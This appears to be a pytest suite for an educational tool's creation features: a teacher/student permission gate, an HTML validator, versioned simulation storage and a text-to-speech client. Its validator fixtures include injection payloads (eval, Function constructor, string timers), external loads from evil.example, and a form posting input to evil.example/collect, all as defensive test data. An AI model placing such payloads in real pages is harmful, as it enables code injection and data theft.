"""Tests for the creation tool pack and the creation boundary gate.

The claims under test are the product's, not the implementation's: the boundary gate
refuses what a student may not do and says why; a scoped edit is scoped and revertible;
generated artifacts are validated before they exist on disk; and every provider-backed
tool reports its own absence honestly instead of faking output.
"""

import sys
import zipfile
from dataclasses import dataclass, field
from pathlib import Path
from types import ModuleType, SimpleNamespace

import pytest

from app.harness import creation_gate, provider, sims_store, toolbox
from app.harness.media import Candidate
from app.harness.tools_creation import extract_html

# ------------------------------------------------------------------- fixtures

GOOD_SIM = """<!doctype html>
<html>
<head><meta charset="utf-8"><title>Supply and demand</title>
<style>body { font-family: sans-serif; }</style>
</head>
<body>
<h1>Supply and demand</h1>
<svg viewBox="0 0 100 100">
  <polyline data-series="demand" points="0,10 90,90" />
  <polyline data-series="supply" points="0,90 90,10" />
</svg>
<p>Price: <output id="out">5</output></p>
<script>
  let price = 5;
  function shiftTax() { price += 1; document.getElementById('out').textContent = price; }
</script>
<button onclick="shiftTax()">Shift tax</button>
</body>
</html>"""

EXTERNAL_SCRIPT_SIM = GOOD_SIM.replace('<style>', '<script src="https://cdn.example.com/x.js"></script><style>')

EVIL_SIM = GOOD_SIM.replace('let price = 5;', 'let price = eval(userInput);')

FORM_SIM = GOOD_SIM.replace('<button onclick="shiftTax()">Shift tax</button>',
                            '<form action="https://evil.example/collect"><input></form>')

NO_SERIES_SIM = GOOD_SIM.replace('data-series="demand" ', '').replace('data-series="supply" ', '')

EDITED_SIM = GOOD_SIM.replace('let price = 5;', 'let price = 4;')


@dataclass
class FakeSettings:
    data_dir: Path
    media_enabled: bool = False
    #: Voice output is a *separate* gate from media (``HARNESS_VOICE_ENABLED``), and in
    #: production it defaults off so an unattended instance never talks. Here it defaults
    #: on, because the overwhelming majority of the TTS tests exist to prove what happens
    #: once the provider is contacted; the one test that pins the refusal states its
    #: precondition explicitly. Leaving this field off the double entirely is what broke
    #: fourteen tests when the gate was introduced: they set ``media_enabled`` and then
    #: asserted on a transport that was never reached.
    voice_enabled: bool = True
    media_timeout: float = 4.0
    provider: str = 'offline'
    provider_url: str = ''
    provider_key: str = 'test-key'
    provider_model: str = 'test-model'
    provider_timeout: float = 4.0
    sims_dir: str = ''
    extra: dict = field(default_factory=dict)


@pytest.fixture
def settings(tmp_path):
    return FakeSettings(data_dir=tmp_path / 'data')


def ctx_for(settings, role=None):
    """A tool context whose authenticated principal carries the given role.

    The role lives on the account, exactly as the production code resolves it; no test
    may pass a role through a tool argument, because the tool no longer accepts one.
    """
    user = SimpleNamespace(role=role) if role is not None else None
    return toolbox.ToolContext(settings=settings, user=user, now=1_700_000_000.0)


class FakeProvider:
    """A provider.chat stand-in that returns a canned reply, or a sequence of them.

    A list models the retry path: the first reply is consumed, and the last one is
    returned for every call after that, so a test can say "bad then good" or "bad
    forever" without counting calls itself.
    """

    def __init__(self, reply):
        self.replies = list(reply) if isinstance(reply, list) else [reply]
        self.calls: list[dict] = []

    def install(self, monkeypatch):
        import app.harness.provider as p
        monkeypatch.setattr(p, 'available', lambda s: True)
        monkeypatch.setattr(p, 'chat', self._chat)

    def _chat(self, settings, messages, **kwargs):
        self.calls.append({'messages': messages, **kwargs})
        return self.replies.pop(0) if len(self.replies) > 1 else self.replies[0]


# ----------------------------------------------------------------- the gate

def test_gate_student_create_is_refused_with_reason():
    decision = creation_gate.evaluate({'role': 'student', 'category': 'create',
                                       'note': 'make me a physics game'})
    assert not decision['approved']
    assert 'teacher' in decision['reason'].casefold()
    assert 'bug' in decision['reason']  # the refusal names what the student CAN do


def test_gate_student_change_requests_are_approved_as_requirements():
    for category in creation_gate.STUDENT_CATEGORIES:
        decision = creation_gate.evaluate({'role': 'student', 'category': category,
                                           'note': 'the curve does not move'})
        assert decision['approved'], category
        # The point of the gate: the student request becomes a scoped requirement.
        assert 'the curve does not move' in decision['requirement']
        assert decision['requirement'] != 'the curve does not move'


def test_gate_teacher_can_create_and_restructure():
    for category in ('create', 'restructure'):
        decision = creation_gate.evaluate({'role': 'teacher', 'category': category,
                                           'note': 'rebuild around a market shock'})
        assert decision['approved'], category


def test_gate_unknown_role_fails_closed_to_student():
    decision = creation_gate.evaluate({'role': '', 'category': 'create', 'note': 'x'})
    assert not decision['approved']
    assert decision['role'] == 'student'
    weird = creation_gate.evaluate({'role': 'admin', 'category': 'create', 'note': 'x'})
    assert not weird['approved']
    assert weird['role'] == 'student'


@pytest.mark.parametrize('variant', ['TEACHER', 'teacher ', ' Teacher', 'teacher\n',
                                     '\tteacher', 'Teacher', 'admin', None, ''])
def test_gate_teacher_grant_requires_exact_canonical_string(variant):
    """Regression (verify unit-3): case/whitespace normalisation must not grant."""
    decision = creation_gate.evaluate({'role': variant, 'category': 'create',
                                       'note': 'build me something'})
    assert not decision['approved'], variant
    assert decision['role'] == 'student', variant


def test_gate_teacher_grant_still_works_and_canonical_student_passes_categories():
    assert creation_gate.evaluate({'role': 'teacher', 'category': 'create',
                                   'note': 'x'})['approved']
    for category in creation_gate.STUDENT_CATEGORIES:
        assert creation_gate.evaluate({'role': 'student', 'category': category,
                                       'note': 'y'})['approved'], category


def test_gate_student_empty_note_is_refused():
    decision = creation_gate.evaluate({'role': 'student', 'category': 'bug', 'note': ''})
    assert not decision['approved']
    assert 'describe' in decision['reason'].casefold()


def test_gate_student_create_proceeds_only_on_an_approved_record(settings):
    none_yet = creation_gate.evaluate({'role': 'student', 'category': 'create',
                                       'note': 'x', 'approval_id': 'appr-1'})
    assert not none_yet['approved']
    pending = creation_gate.evaluate({'role': 'student', 'category': 'create',
                                      'note': 'x', 'approval_id': 'appr-1'},
                                     approvals={'appr-1': {'status': 'pending'}})
    assert not pending['approved']
    approved = creation_gate.evaluate({'role': 'student', 'category': 'create',
                                       'note': 'x', 'approval_id': 'appr-1'},
                                      approvals={'appr-1': {'status': 'approved'}})
    assert approved['approved']
    assert 'approval record' in ' '.join(approved['notes']).casefold()


def test_gate_unknown_category_is_refused():
    decision = creation_gate.evaluate({'role': 'student', 'category': 'make_it_cool',
                                       'note': 'x'})
    assert not decision['approved']
    assert 'not a change category' in decision['reason']


def test_approval_records_persist_to_disk(settings):
    from app.harness import sims_store
    record = creation_gate.save_approval(settings, creation_gate.new_approval_id(),
                                         status='approved', by='t1', category='create',
                                         note='ok')
    assert record['status'] == 'approved'
    assert creation_gate.load_approvals(settings)[record['id']]['status'] == 'approved'


# ------------------------------------------------------- artifact validation

def test_validation_accepts_a_good_sim_and_rejects_the_bad_ones():
    assert sims_store.validate_html(GOOD_SIM, kind='simulation') == []
    assert any('data-series' in p for p in sims_store.validate_html(NO_SERIES_SIM, kind='simulation'))
    assert any('outside host' in p for p in sims_store.validate_html(EXTERNAL_SCRIPT_SIM))
    assert any('eval' in p for p in sims_store.validate_html(EVIL_SIM))
    assert any('form posts' in p for p in sims_store.validate_html(FORM_SIM))
    assert sims_store.validate_html('<html><body><p>trunc', kind='deck')
    assert sims_store.validate_html('', kind='deck')


# Regression (verify unit-3): validator bypasses measured with well-formed artifacts.
BARE_FUNCTION_SIM = GOOD_SIM.replace('let price = 5;', 'Function("alert(1)")();')
CSS_IMPORT_SIM = GOOD_SIM.replace(
    '<style>body { font-family: sans-serif; }</style>',
    '<style>@import url("https://evil.example/theme.css");'
    'body { font-family: sans-serif; }</style>')
SRCSET_SIM = GOOD_SIM.replace(
    '<h1>Supply and demand</h1>',
    '<h1>Supply and demand</h1><img srcset="https://evil.example/i.jpg 1x" src="/x">')
NAMED_FUNCTION_SIM = GOOD_SIM.replace(
    'function shiftTax()', 'function myFunction()')


@pytest.mark.parametrize('bad,needle', [
    (BARE_FUNCTION_SIM, 'Function'), (CSS_IMPORT_SIM, '@import'),
    (SRCSET_SIM, 'outside host')])
def test_validator_catches_the_measured_bypasses(bad, needle):
    problems = sims_store.validate_html(bad, kind='simulation')
    assert problems and any(needle in p for p in problems), problems


def test_validator_still_allows_ordinary_named_functions():
    assert sims_store.validate_html(NAMED_FUNCTION_SIM, kind='simulation') == []


def test_validator_allows_the_lowercase_function_keyword():
    """Regression (web workbench): `function (event) {...}` is the JS keyword, not the
    Function constructor; a case-insensitive match refused every authored callback."""
    callback_sim = GOOD_SIM.replace(
        'function shiftTax() { price += 1;',
        'document.querySelector("button").addEventListener("click", function (event) { price += 1; })}\n'
        'function unused() {')
    assert sims_store.validate_html(callback_sim, kind='simulation') == []
    constructor_sim = GOOD_SIM.replace('let price = 5;', 'window.Function("return 1")();')
    assert sims_store.validate_html(constructor_sim, kind='simulation')


# Regression (adversarial verify, round 2): three residual bypasses measured in a
# served sim -- bracketed-string member calls on the global object, the no-whitespace
# CSS @import, and timer functions handed a string of code.
BRACKET_GLOBAL_FUNCTION_SIM = GOOD_SIM.replace(
    'let price = 5;', "globalThis['Function']('alert(1)')();")
BRACKET_WINDOW_EVAL_SIM = GOOD_SIM.replace(
    'let price = 5;', 'window["eval"](userInput);')
BRACKET_SELF_FUNCTION_SIM = GOOD_SIM.replace(
    'let price = 5;', "self['function']('return 1')();")
NO_SPACE_CSS_IMPORT_SIM = GOOD_SIM.replace(
    '<style>body { font-family: sans-serif; }</style>',
    "<style>@import'https://evil.example/theme.css';"
    'body { font-family: sans-serif; }</style>')
TIMER_STRING_TIMEOUT_SIM = GOOD_SIM.replace(
    'let price = 5;', "setTimeout('price += 1', 100);")
TIMER_STRING_INTERVAL_SIM = GOOD_SIM.replace(
    'let price = 5;', 'setInterval("price += 1", 100);')


@pytest.mark.parametrize('bad,needle', [
    (BRACKET_GLOBAL_FUNCTION_SIM, 'eval'),
    (BRACKET_WINDOW_EVAL_SIM, 'eval'),
    (BRACKET_SELF_FUNCTION_SIM, 'eval'),
    (NO_SPACE_CSS_IMPORT_SIM, '@import'),
    (TIMER_STRING_TIMEOUT_SIM, 'setTimeout'),
    (TIMER_STRING_INTERVAL_SIM, 'setTimeout'),
])
def test_validator_catches_the_residual_bypasses(bad, needle):
    problems = sims_store.validate_html(bad, kind='simulation')
    assert problems and any(needle in p for p in problems), problems


CLEAN_KEYWORD_FOO_SIM = GOOD_SIM.replace(
    'let price = 5;', 'function foo(x) { return x; }')
CLEAN_LOCATION_ACCESS_SIM = GOOD_SIM.replace(
    'let price = 5;', 'let hash = window.location.hash.slice(1);')
CLEAN_GLOBAL_MATH_SIM = GOOD_SIM.replace(
    'let price = 5;', 'let clamp = globalThis.Math.max(price, 0);')
CLEAN_TIMER_REF_SIM = GOOD_SIM.replace(
    'let price = 5;', 'setTimeout(shiftTax, 100);\nsetInterval(shiftTax, 1000);')


@pytest.mark.parametrize('clean', [
    GOOD_SIM,
    # `function (event)` keyword callback and `function unused(` declarations.
    GOOD_SIM.replace(
        'function shiftTax() { price += 1;',
        'document.querySelector("button").addEventListener("click", '
        'function (event) { price += 1; })}\nfunction unused() {'),
    NAMED_FUNCTION_SIM,          # myFunction(
    CLEAN_KEYWORD_FOO_SIM,       # function foo(
    CLEAN_LOCATION_ACCESS_SIM,   # window.location.hash -- plain property access
    CLEAN_GLOBAL_MATH_SIM,       # globalThis.Math.max -- plain property access
    CLEAN_TIMER_REF_SIM,         # setTimeout(fn, 100) -- function reference, no string
])
def test_validator_still_allows_the_clean_forms(clean):
    assert sims_store.validate_html(clean, kind='simulation') == []


def test_deck_kind_does_not_require_data_series():
    deck = '<!doctype html><html><head><title>t</title></head><body><h1>t</h1></body></html>'
    assert sims_store.validate_html(deck, kind='deck') == []
    assert sims_store.validate_html(deck, kind='simulation')


def test_extract_html_tolerates_fences_and_prose():
    fenced = 'Here you go:\n```html\n' + GOOD_SIM + '\n```\nEnjoy.'
    assert extract_html(fenced) == GOOD_SIM
    assert extract_html(GOOD_SIM) == GOOD_SIM
    assert extract_html('no html here at all') == ''


# --------------------------------------------------------------- sim store

def test_store_versions_are_append_only(settings):
    entry = sims_store.create_artifact(settings, kind='simulation', title='S',
                                       html=GOOD_SIM)
    artifact_id = entry['id']
    sims_store.save_version(settings, artifact_id, EDITED_SIM, note='bug fix')
    assert sims_store.read_version(settings, artifact_id) == EDITED_SIM
    assert sims_store.read_version(settings, artifact_id, 1) == GOOD_SIM  # old version kept
    loaded = sims_store.load(settings, artifact_id)
    assert loaded['latest_version'] == 2
    assert (sims_store.store_root(settings) / artifact_id / 'v1.html').exists()
    assert (sims_store.store_root(settings) / artifact_id / 'v2.html').exists()


def test_store_diff_summary_counts_lines(settings):
    diff = sims_store.diff_summary(GOOD_SIM, EDITED_SIM)
    assert diff['added_lines'] == diff['removed_lines'] == 1
    assert 0 < diff['changed_fraction'] < 0.2


def test_store_read_api_is_the_web_layers_path(settings):
    """The /raw contract: latest by default, any version on demand, manifest via load."""
    entry = sims_store.create_artifact(settings, kind='simulation', title='S',
                                       html=GOOD_SIM)
    sims_store.save_version(settings, entry['id'], EDITED_SIM, note='bug')
    assert sims_store.latest_html(settings, entry['id']) == EDITED_SIM
    assert sims_store.read_version(settings, entry['id'], 1) == GOOD_SIM
    assert sims_store.read_version(settings, entry['id'], 99) is None
    assert sims_store.latest_html(settings, 'sim-missing') is None
    assert sims_store.load(settings, entry['id'])['latest_version'] == 2


# --------------------------------------------------------- write_simulation

def test_write_simulation_requires_a_provider(settings):
    result = toolbox.invoke(ctx_for(settings, 'teacher'), 'write_simulation',
                            {'title': 'Supply and demand',
                             'description': 'curves', 'requirements': ['two series']})
    assert not result.ok
    assert 'provider' in result.refused.casefold()
    assert not sims_store.list_artifacts(settings)


def test_write_simulation_gate_refuses_students(settings, monkeypatch):
    FakeProvider(GOOD_SIM).install(monkeypatch)  # even a working provider cannot help
    result = toolbox.invoke(ctx_for(settings, 'student'), 'write_simulation',
                            {'title': 'S'})
    assert not result.ok and result.refused
    assert not sims_store.list_artifacts(settings)


def test_write_simulation_stores_a_validated_artifact(settings, monkeypatch):
    fake = FakeProvider('```html\n' + GOOD_SIM + '\n```')
    fake.install(monkeypatch)
    result = toolbox.invoke(ctx_for(settings, 'teacher'), 'write_simulation',
                            {'title': 'Supply and demand', 'description': 'curves',
                             'requirements': ['hoverable series']})
    assert result.ok, result.refused + result.error
    data = result.data
    stored = sims_store.read_version(settings, data['artifact_id'])
    assert stored == GOOD_SIM
    assert data['raw_url'] == f"/api/v1/sims/{data['artifact_id']}/raw"
    assert data['gate']['role'] == 'teacher'
    # The model was told the rules, not merely trusted to follow them.
    system = fake.calls[0]['messages'][0]['content']
    assert 'data-series' in system and 'self-contained' in system


@pytest.mark.parametrize('bad', [EXTERNAL_SCRIPT_SIM, EVIL_SIM, FORM_SIM, NO_SERIES_SIM])
def test_write_simulation_refuses_invalid_html(settings, monkeypatch, bad):
    FakeProvider(bad).install(monkeypatch)
    result = toolbox.invoke(ctx_for(settings, 'teacher'), 'write_simulation',
                            {'title': 'S'})
    assert not result.ok
    assert result.data['validation_problems']
    assert not sims_store.list_artifacts(settings)


def test_a_truncated_document_is_never_stored(settings, monkeypatch):
    """A generation cut off mid-file is a broken lesson, not a document.

    Regression: extraction used to accept anything that merely *started* with
    ``<!doctype``, so a reply that hit the token ceiling was stored and served as half
    a simulation -- the one failure worse than storing nothing, because it looks fine
    until a learner opens it.
    """
    truncated = GOOD_SIM[:len(GOOD_SIM) // 2]
    assert truncated.startswith('<!doctype')
    assert extract_html(truncated) == ''

    FakeProvider(truncated).install(monkeypatch)
    result = toolbox.invoke(ctx_for(settings, 'teacher'), 'write_simulation',
                            {'title': 'S', 'description': 'curves'})
    assert not result.ok
    assert 'cut off' in result.refused.casefold()
    assert not sims_store.list_artifacts(settings)


def test_a_near_miss_is_retried_with_the_validators_reasons(settings, monkeypatch):
    """One missing convention costs a retry, not the lesson's artefact.

    Measured 2026-11-01 across five subjects: four validated first time and the fifth
    (a canvas action-potential scope) failed on a convention rather than on the idea.
    The second attempt is told exactly what the validator rejected, so the retry is a
    correction rather than a repetition.
    """
    fake = FakeProvider([NO_SERIES_SIM, GOOD_SIM])
    fake.install(monkeypatch)
    result = toolbox.invoke(ctx_for(settings, 'teacher'), 'write_simulation',
                            {'title': 'S', 'description': 'curves'})
    assert result.ok, result.refused + result.error
    assert len(fake.calls) == 2
    retry = fake.calls[1]['messages'][1]['content']
    assert 'rejected by the structural validator' in retry
    assert 'data-series' in retry
    assert sims_store.read_version(settings, result.data['artifact_id']) == GOOD_SIM


def test_a_repeated_failure_reports_the_problems_and_stops(settings, monkeypatch):
    """The retry is bounded, and what comes back names the rule that was broken."""
    fake = FakeProvider(NO_SERIES_SIM)
    fake.install(monkeypatch)
    result = toolbox.invoke(ctx_for(settings, 'teacher'), 'write_simulation',
                            {'title': 'S'})
    assert not result.ok
    assert any('data-series' in problem for problem in result.data['validation_problems'])
    assert len(fake.calls) == 2, 'the attempt budget is bounded, not a loop'
    assert not sims_store.list_artifacts(settings)


# ------------------------------------------------ privilege-escalation regression

def test_tool_specs_do_not_expose_a_role_argument():
    """Regression (verify unit-3): the model must have no role lever at all."""
    for name in ('write_simulation', 'edit_simulation'):
        spec = toolbox.REGISTRY[name][0]
        assert 'role' not in spec.arguments, name


def test_role_tool_argument_is_rejected(settings, monkeypatch):
    """The verifier's exact repro: student principal + {'role': 'TEACHER'} must fail."""
    FakeProvider(GOOD_SIM).install(monkeypatch)
    result = toolbox.invoke(ctx_for(settings, 'student'), 'write_simulation',
                            {'title': 'S', 'role': 'TEACHER'})
    assert not result.ok
    assert result.refused  # bad arguments, not a silent pass-through
    assert not sims_store.list_artifacts(settings)


def test_unauthenticated_context_is_a_student(settings, monkeypatch):
    FakeProvider(GOOD_SIM).install(monkeypatch)
    result = toolbox.invoke(ctx_for(settings), 'write_simulation', {'title': 'S'})
    assert not result.ok
    assert 'teacher' in result.refused.casefold()
    assert not sims_store.list_artifacts(settings)


# ---------------------------------------------------------- edit_simulation

def test_edit_simulation_scoped_bug_request_bumps_version(settings, monkeypatch):
    entry = sims_store.create_artifact(settings, kind='simulation', title='S', html=GOOD_SIM)
    FakeProvider(EDITED_SIM).install(monkeypatch)
    result = toolbox.invoke(ctx_for(settings, 'student'), 'edit_simulation',
                            {'artifact_id': entry['id'], 'requirement_category': 'bug',
                             'requirement_note': 'default price is wrong; should start at 4'})
    assert result.ok, result.refused + result.error
    assert result.data['version'] == 2
    assert result.data['previous_version'] == 1
    assert sims_store.read_version(settings, entry['id'], 1) == GOOD_SIM  # revertible


def test_edit_simulation_student_cannot_restructure(settings, monkeypatch):
    entry = sims_store.create_artifact(settings, kind='simulation', title='S', html=GOOD_SIM)
    FakeProvider(EDITED_SIM).install(monkeypatch)
    result = toolbox.invoke(ctx_for(settings, 'student'), 'edit_simulation',
                            {'artifact_id': entry['id'], 'requirement_category': 'restructure',
                             'requirement_note': 'rebuild the whole thing'})
    assert not result.ok and 'teacher' in result.refused.casefold()
    assert sims_store.load(settings, entry['id'])['latest_version'] == 1


def test_edit_simulation_teacher_restructure_is_allowed(settings, monkeypatch):
    entry = sims_store.create_artifact(settings, kind='simulation', title='S', html=GOOD_SIM)
    FakeProvider(EDITED_SIM).install(monkeypatch)
    result = toolbox.invoke(ctx_for(settings, 'teacher'), 'edit_simulation',
                            {'artifact_id': entry['id'], 'requirement_category': 'restructure',
                             'requirement_note': 'two-panel layout'})
    assert result.ok, result.refused + result.error


def test_edit_simulation_invalid_update_leaves_previous_version_serving(settings, monkeypatch):
    entry = sims_store.create_artifact(settings, kind='simulation', title='S', html=GOOD_SIM)
    FakeProvider(EVIL_SIM).install(monkeypatch)
    result = toolbox.invoke(ctx_for(settings, 'teacher'), 'edit_simulation',
                            {'artifact_id': entry['id'], 'requirement_category': 'bug',
                             'requirement_note': 'fix the loop'})
    assert not result.ok and result.data['validation_problems']
    assert sims_store.read_version(settings, entry['id']) == GOOD_SIM
    assert sims_store.load(settings, entry['id'])['latest_version'] == 1


def test_edit_simulation_unknown_artifact_is_an_error(settings, monkeypatch):
    FakeProvider(EDITED_SIM).install(monkeypatch)
    result = toolbox.invoke(ctx_for(settings, 'teacher'), 'edit_simulation',
                            {'artifact_id': 'sim-nope', 'requirement_category': 'bug',
                             'requirement_note': 'x'})
    assert not result.ok and 'Unknown artifact' in result.error


# ----------------------------------------------------------- generate_slides

def test_generate_slides_writes_a_real_deck_and_pptx(settings):
    result = toolbox.invoke(ctx_for(settings), 'generate_slides',
                            {'title': 'Supply and demand',
                             'sections': [
                                 {'heading': 'Demand', 'bullets': ['Downward sloping'],
                                  'notes': 'Ask for a prediction first.'},
                                 {'heading': 'Equilibrium', 'bullets': ['Where they cross'],
                                  'notes': ''}]})
    assert result.ok, result.refused + result.error
    artifact_id = result.data['artifact_id']
    html_path = (sims_store.store_root(settings) / artifact_id / 'v1.html')
    assert html_path.exists() and html_path.read_text().count('class="slide"') == 2
    pptx_path = sims_store.store_root(settings) / artifact_id / 'v1.pptx'
    assert pptx_path.exists()
    with zipfile.ZipFile(pptx_path) as bundle:  # a real pptx is a zip package
        assert 'ppt/presentation.xml' in bundle.namelist()


def test_generate_slides_from_authored_curriculum(settings):
    result = toolbox.invoke(ctx_for(settings), 'generate_slides',
                            {'title': 'Fractions', 'concept_id': 'fractions'})
    assert result.ok, result.refused + result.error
    assert result.data['slides'] >= 2
    assert any(c['kind'] == 'authored_lesson' for c in result.citations)


def test_generate_slides_without_input_refuses_honestly(settings):
    result = toolbox.invoke(ctx_for(settings), 'generate_slides',
                            {'title': 'Nothing', 'concept_id': 'not-a-concept'})
    assert not result.ok and result.refused


# ------------------------------------------------------------ text_to_speech
#
# The provider is a local VoiceStudio backend reached over HTTP, so these tests
# stub the transport rather than a Python module. Each one pins a distinct
# outcome: the point of the provider change is that "no audio" now has six
# different causes and six different fixes, and collapsing them into one
# message would be the thing that makes an operator guess.

def _voice_transport(monkeypatch, handler):
    """Route the voice client through an httpx mock transport."""
    import httpx

    from app.harness import voice

    def _client(settings, *, read_timeout):
        return httpx.Client(transport=httpx.MockTransport(handler), timeout=5.0)

    monkeypatch.setattr(voice, '_client', _client)


def _audio_handler(captured=None, content=b'ID3FakeMP3Bytes'):
    import httpx

    def handler(request):
        if captured is not None:
            import json
            captured.append(json.loads(request.content))
        return httpx.Response(200, content=content,
                              headers={'content-type': 'audio/mpeg'})
    return handler


def test_tts_refuses_honestly_when_voice_output_is_off(settings):
    # Stated, not inherited: the fixture enables voice so the other TTS tests can reach
    # the provider. This test is the one that pins the gate.
    settings.voice_enabled = False
    result = toolbox.invoke(ctx_for(settings), 'text_to_speech', {'text': 'Hello.'})
    assert not result.ok
    assert 'switched off' in result.refused.casefold()
    # The old wording claimed the network was the reason. VoiceStudio is loopback,
    # so that sentence would now be false; the note says what the flag really means.
    assert any('not a network' in note for note in result.notes)


def test_tts_names_the_missing_service_and_how_to_start_it(settings, monkeypatch):
    import httpx
    settings.media_enabled = True

    def refuse(request):
        raise httpx.ConnectError('connection refused', request=request)

    _voice_transport(monkeypatch, refuse)
    result = toolbox.invoke(ctx_for(settings), 'text_to_speech', {'text': 'Hello.'})
    assert not result.ok
    assert '127.0.0.1:3900' in result.refused
    assert 'voicestudio.sh/install' in result.refused
    assert 'HARNESS_VOICE_BASE_URL' in result.refused


def test_tts_produces_audio_when_the_service_answers(settings, monkeypatch):
    settings.media_enabled = True
    captured = []
    _voice_transport(monkeypatch, _audio_handler(captured))
    result = toolbox.invoke(ctx_for(settings), 'text_to_speech',
                            {'text': 'Demand slopes downward.'})
    assert result.ok, result.refused + result.error
    assert result.data['provider'] == 'voicestudio'
    assert result.data['model'] == 'omnivoice'
    assert (settings.data_dir / result.data['path']).stat().st_size > 0
    # The OpenAI-compatible contract, not an ad-hoc one.
    assert captured[0]['input'] == 'Demand slopes downward.'
    assert captured[0]['response_format'] == 'mp3'
    assert captured[0]['voice'] == 'default'
    assert captured[0]['speed'] == 1.0


def test_tts_rejects_a_200_that_is_not_audio(settings, monkeypatch):
    """A proxy error page with status 200 must not become a playable-looking file."""
    import httpx
    settings.media_enabled = True
    _voice_transport(monkeypatch, lambda request: httpx.Response(
        200, content=b'{"error": "upstream"}',
        headers={'content-type': 'application/json'}))
    result = toolbox.invoke(ctx_for(settings), 'text_to_speech', {'text': 'Hello.'})
    assert not result.ok
    assert 'application/json' in result.error
    audio_dir = settings.data_dir / 'media' / 'audio'
    assert not audio_dir.exists() or not list(audio_dir.iterdir())


def test_tts_maps_a_licence_refusal_to_an_actionable_message(settings, monkeypatch):
    import httpx
    settings.media_enabled = True
    _voice_transport(monkeypatch, lambda request: httpx.Response(
        403, json={'error': {'message': 'licence not accepted',
                             'type': 'permission_error', 'code': 'model_license'}}))
    result = toolbox.invoke(ctx_for(settings), 'text_to_speech', {'text': 'Hello.'})
    assert not result.ok
    assert 'licence' in result.refused.casefold()
    assert 'licence not accepted' in result.refused


def test_tts_translates_edge_rate_syntax_into_a_speed_multiplier(settings, monkeypatch):
    settings.media_enabled = True
    captured = []
    _voice_transport(monkeypatch, _audio_handler(captured))
    result = toolbox.invoke(ctx_for(settings), 'text_to_speech',
                            {'text': 'Hello.', 'rate': '+25%'})
    assert result.ok, result.refused + result.error
    assert captured[0]['speed'] == 1.25
    assert result.data['speed'] == 1.25


def test_tts_clamps_a_rate_the_provider_would_reject(settings, monkeypatch):
    """4x is VoiceStudio's ceiling; a request above it must not become a 400."""
    settings.media_enabled = True
    captured = []
    _voice_transport(monkeypatch, _audio_handler(captured))
    result = toolbox.invoke(ctx_for(settings), 'text_to_speech',
                            {'text': 'Hello.', 'rate': '+900%'})
    assert result.ok, result.refused + result.error
    assert captured[0]['speed'] == 4.0
    assert any('outside the provider range' in note for note in result.notes)


def test_tts_does_not_silently_accept_an_edge_voice_name(settings, monkeypatch):
    """An edge voice name is not a VoiceStudio voice; substituting is fine, silence is not."""
    settings.media_enabled = True
    captured = []
    _voice_transport(monkeypatch, _audio_handler(captured))
    result = toolbox.invoke(ctx_for(settings), 'text_to_speech',
                            {'text': 'Hello.', 'voice': 'en-US-AriaNeural'})
    assert result.ok, result.refused + result.error
    assert captured[0]['voice'] == 'default'
    assert any('edge-tts voice name' in note for note in result.notes)


def test_tts_refuses_text_beyond_the_provider_limit(settings, monkeypatch):
    settings.media_enabled = True
    _voice_transport(monkeypatch, _audio_handler())
    result = toolbox.invoke(ctx_for(settings), 'text_to_speech', {'text': 'a ' * 2100})
    assert not result.ok
    assert '4096' in result.refused


# ---- tone ("speak it like a teacher", not "speak it") ----
#
# A style instruction is the difference between narration and a teacher talking.
# The provider accepts it as OpenAI's `instructions` and forwards it to the
# engine as `instruct`. The trap these tests exist for: the OmniVoice family
# accepts only speaker-design tags and DROPS prose with a 200, so a tone can be
# requested, ignored, and still reported as applied.

def test_tts_sends_a_tone_to_a_freeform_instruction_engine(settings, monkeypatch):
    settings.media_enabled = True
    settings.voice_model = 'cosyvoice'
    captured = []
    _voice_transport(monkeypatch, _audio_handler(captured))
    result = toolbox.invoke(ctx_for(settings), 'text_to_speech',
                            {'text': 'Hello.', 'tone': 'warm, patient teacher'})
    assert result.ok, result.refused + result.error
    assert captured[0]['instructions'] == 'warm, patient teacher'
    assert result.data['tone'] == 'warm, patient teacher'
    # Nothing was lost, so nothing about the tone needs explaining (the caching
    # note is unrelated and always present).
    assert not any('speaker-design' in note or 'dropped' in note for note in result.notes)


def test_tts_reduces_a_tone_to_omnivoice_speaker_design_tags(settings, monkeypatch):
    """OmniVoice keeps tags and discards prose; the note must say so."""
    settings.media_enabled = True
    captured = []
    _voice_transport(monkeypatch, _audio_handler(captured))
    result = toolbox.invoke(
        ctx_for(settings), 'text_to_speech',
        {'text': 'Hello.', 'tone': 'a warm female teacher, young adult, moderate pitch'})
    assert result.ok, result.refused + result.error
    assert captured[0]['instructions'] == 'female, young adult, moderate pitch'
    assert any('speaker-design tags' in note for note in result.notes)


def test_tts_does_not_claim_a_tone_omnivoice_cannot_express(settings, monkeypatch):
    settings.media_enabled = True
    captured = []
    _voice_transport(monkeypatch, _audio_handler(captured))
    result = toolbox.invoke(ctx_for(settings), 'text_to_speech',
                            {'text': 'Hello.', 'tone': 'warm and encouraging'})
    assert result.ok, result.refused + result.error
    # Nothing is sent, because sending it would be a no-op dressed as a request.
    assert 'instructions' not in captured[0]
    assert result.data['tone'] == ''
    assert any('dropped' in note for note in result.notes)


def test_tts_passes_a_pure_tag_tone_through_without_a_lecture(settings, monkeypatch):
    """An already-valid tag list lost nothing, so there is nothing to explain."""
    settings.media_enabled = True
    captured = []
    _voice_transport(monkeypatch, _audio_handler(captured))
    result = toolbox.invoke(ctx_for(settings), 'text_to_speech',
                            {'text': 'Hello.', 'tone': 'female, young adult, moderate pitch'})
    assert result.ok, result.refused + result.error
    assert captured[0]['instructions'] == 'female, young adult, moderate pitch'
    assert not any('dropped' in note for note in result.notes)


def test_tts_keeps_different_tones_out_of_each_others_cache(settings, monkeypatch):
    """The digest covered text/voice/speed only; two tones would share one file."""
    settings.media_enabled = True
    settings.voice_model = 'cosyvoice'
    _voice_transport(monkeypatch, _audio_handler())
    first = toolbox.invoke(ctx_for(settings), 'text_to_speech',
                           {'text': 'Hello.', 'tone': 'patient and slow'})
    second = toolbox.invoke(ctx_for(settings), 'text_to_speech',
                            {'text': 'Hello.', 'tone': 'bright and brisk'})
    assert first.ok and second.ok
    assert first.data['path'] != second.data['path']


def test_tts_replays_a_cached_recording_without_synthesising_again(settings, monkeypatch):
    """A replayed passage must not cost another 20-40 s of synthesis."""
    import httpx

    settings.media_enabled = True
    requests = []

    def handler(request):
        requests.append(request)
        return httpx.Response(200, content=b'ID3FakeMP3Bytes',
                              headers={'content-type': 'audio/mpeg'})

    _voice_transport(monkeypatch, handler)
    first = toolbox.invoke(ctx_for(settings), 'text_to_speech', {'text': 'Replay me.'})
    second = toolbox.invoke(ctx_for(settings), 'text_to_speech', {'text': 'Replay me.'})
    assert first.ok and second.ok
